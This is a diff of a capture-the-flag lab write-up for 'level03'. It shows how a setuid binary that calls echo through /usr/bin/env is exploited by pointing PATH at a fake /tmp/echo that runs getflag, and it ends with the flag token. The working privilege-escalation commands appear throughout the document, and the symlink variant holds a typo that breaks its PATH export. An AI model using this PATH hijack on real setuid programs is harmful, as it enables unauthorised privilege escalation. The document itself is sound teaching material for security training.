@@ -1,23 +1,22 @@
 solution level03:
 
--> ls -la
+> ls -la
 -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
 
 -> the owner of the program is the user flag03. the file permissions indicate that the setuid bit is set, so the program could run commands such as getflag
 
 -> we check the strings contained in the executable
-objdump -S -j .rodata level03
-
+> objdump -S -j .rodata level03
 "..../usr/bin/env"
 " echo Exploit me"
 
 -> we can change the PATH environment variable to use a fake echo which will execute the getflag command
-echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH;
+> echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH;
 
 (we can also create a symbolic link)
-ln -s /bin/getflag /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;$PATH;
+> ln -s /bin/getflag /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;$PATH;
 
--> we execute the exploit
-./level03
+-> we execute the program
+> ./level03
 
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
